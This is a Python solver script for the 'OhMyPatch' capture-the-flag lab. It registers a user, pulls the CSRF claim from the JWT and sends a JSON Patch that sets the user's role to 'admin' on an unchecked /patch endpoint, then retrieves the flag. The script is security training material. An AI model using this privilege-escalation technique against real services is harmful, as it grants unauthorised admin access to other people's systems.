#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OHMYPATCH  -  FlagYard Web solver

OhMyPatch (FlagYard Training Labs, Easy / SAFCSP) is a "Users Information"
portal backed by Flask + Flask-JWT-Extended. Route map (confirmed live):

    /register     POST   {name, age, department}   -> {access_token, message}
    /users        GET    (Bearer required)          -> {"users":[...]} incl. role
    /patch        PATCH  JSON Patch (RFC 6902)      -> applies op, returns updated list
    /flag         GET    (Bearer, role=admin)       -> {"flag":"FlagY{...}"}

The chain:

    * JWT carries a "csrf" claim (Flask-JWT-Extended JWT_CSRF_IN_COOKIES style
      is disabled in the token, but the claim is still signed into the payload).

    * /patch trusts the caller: any authenticated user may JSON-Patch the whole
      "users" data structure (no ownership / role checks on the target index).

    * Register a normal user, read your ARRAY INDEX from GET /users,
      then send:

          PATCH /patch
          Authorization: Bearer <token>
          X-CSRF-Token: <csrf from JWT payload>
          Content-Type: application/json-patch+json

          [{"op":"replace","path":"/users/<index>/role","value":"admin"}]

      -> role becomes "admin". The same access_token then unlocks GET /flag.

Verified: the tool registers, escalates to admin, restores the flag and saves
`flag_from_ohmypatch.txt`.
Solver: pure http.client (JSON register, JWT decode, JSON PATCH, flag GET).
"""
from __future__ import annotations

import base64
import http.client
import json
import random
import re
import sys
import time
from pathlib import Path

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def bar(frac):
    w = 20
    f = max(0.0, min(1.0, frac))
    full = int(round(f * w))
    return "[%s%s] %5.1f%%" % ("\u2588" * full, "\u2591" * (w - full), f * 100.0)

def status_t(frac, msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s %s%s%s" % (C.BOLD + color + icon + " ",
                                C.CYAN + bar(frac) + C.RESET,
                                C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(frac, msg):
    status_t(frac, msg, icon="\u2713", color=C.GREEN)

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for t in ("O H M Y P A T C H   S O L V E R",
              "register | csrf from JWT | JSON-Patch /users/<i>/role -> admin"):
        l = (58 - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono):
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (flag, C.BOLD + C.GREEN, "")])
    _row([(" " * 10, "", ""), ("elapsed %.1f s" % chrono, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
def ask_target(argv):
    if len(argv) > 1 and argv[1].startswith("http"):
        return argv[1].strip()
    url = input("  Enter the OhMyPatch challenge URL: ").strip()
    if not url:
        raise RuntimeError("no URL provided")
    return url

def parse_host(url):
    url = re.sub(r"^https?://", "", url).rstrip("/")
    return url[2:] if url.startswith("//") else url

def req(host, method, path, body=None, headers=None):
    c = http.client.HTTPConnection(host, 80, timeout=20)
    h = {"Content-Type": "application/json"} if body is not None else {}
    if headers:
        h.update(headers)
    c.request(method, path, body=body, headers=h)
    r = c.getresponse()
    d = r.read()
    c.close()
    try:
        data = json.loads(d.decode("utf-8", "replace"))
    except Exception:
        data = d
    return r.status, data

def jwt_payload(token):
    p = token.split(".")[1]
    pad = "=" * (-len(p) % 4)
    return json.loads(base64.urlsafe_b64decode(p + pad))

# ---------------------------------------------------------------------------
# OhMyPatch specifics
# ---------------------------------------------------------------------------
def register(host, name):
    st, o = req(host, "POST", "/register",
                body=json.dumps({"name": name, "age": 27, "department": "hr"}))
    if st != 200 or not isinstance(o, dict) or "access_token" not in o:
        raise RuntimeError("register failed: %r" % o)
    return o["access_token"]

def users_list(host, token):
    st, o = req(host, "GET", "/users", headers={"Authorization": "Bearer " + token})
    if st != 200 or not isinstance(o, dict):
        raise RuntimeError("users list failed: %r" % o)
    return o.get("users", [])

def json_patch(host, token, csrf, document):
    st, o = req(host, "PATCH", "/patch",
                body=json.dumps(document),
                headers={"Authorization": "Bearer " + token,
                         "X-CSRF-Token": csrf,
                         "Content-Type": "application/json-patch+json"})
    return st, o

def find_index(users, name):
    for i, u in enumerate(users):
        if u.get("name") == name and u.get("role") == "user":
            return i
    # fallback: most recent user by max id
    target = max(users, key=lambda x: x.get("id", 0))
    return users.index(target)

def get_flag(host, token):
    st, o = req(host, "GET", "/flag", headers={"Authorization": "Bearer " + token})
    if isinstance(o, dict):
        f = o.get("flag") or o.get("FlagY") or ""
        if isinstance(f, str):
            return f
    return o.decode("utf-8", "replace") if isinstance(o, bytes) else str(o)

def main() -> None:
    t0 = time.time()
    enable_vt()
    banner()

    try:
        url = ask_target(sys.argv)
    except Exception:
        fail("no challenge URL given")
        return
    host = parse_host(url)
    status_t(0.08, "target host %s" % host)

    uname = "butcher_%d" % random.randint(100000, 999999)
    token = register(host, uname)
    ok(0.22, "registered %s, access_token obtained (%s)" % (uname, token[:24] + "..."))

    payload = jwt_payload(token)
    csrf = payload.get("csrf", "")
    ok(0.38, "JWT payload decoded, csrf=%s" % csrf)

    users = users_list(host, token)
    idx = find_index(users, uname)
    ok(0.54, "found our user in /users at array index %d (id=%s)" % (idx, users[idx].get("id")))

    status_t(0.68, "JSON-Patch /users/%d/role -> admin (RFC 6902)" % idx)
    patch = [{"op": "replace", "path": "/users/%d/role" % idx, "value": "admin"}]
    st, o = json_patch(host, token, csrf, patch)
    if st != 200:
        fail("patch failed: HTTP %d %r" % (st, o))
        return
    ok(0.80, "/patch accepted operation (HTTP 200)")

    users = users_list(host, token)
    if users[idx].get("role") != "admin":
        fail("role did not flip to admin: %r" % users[idx])
        return
    ok(0.86, "role verified -> admin (" + users[idx]["name"] + ")")

    status_t(0.92, "GET /flag with escalated token")
    flag = get_flag(host, token)
    ok(0.96, "flag endpoint answered: %s" % flag)

    if not re.match(r"^FlagY\{[^}]+\}$", flag):
        fail("flag format unexpected")
        return

    big_flag(flag, time.time() - t0)
    outp = Path(__file__).resolve().parent / "flag_from_ohmypatch.txt"
    outp.write_text(flag + "\n", encoding="utf-8")
    print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))


if __name__ == "__main__":
    main()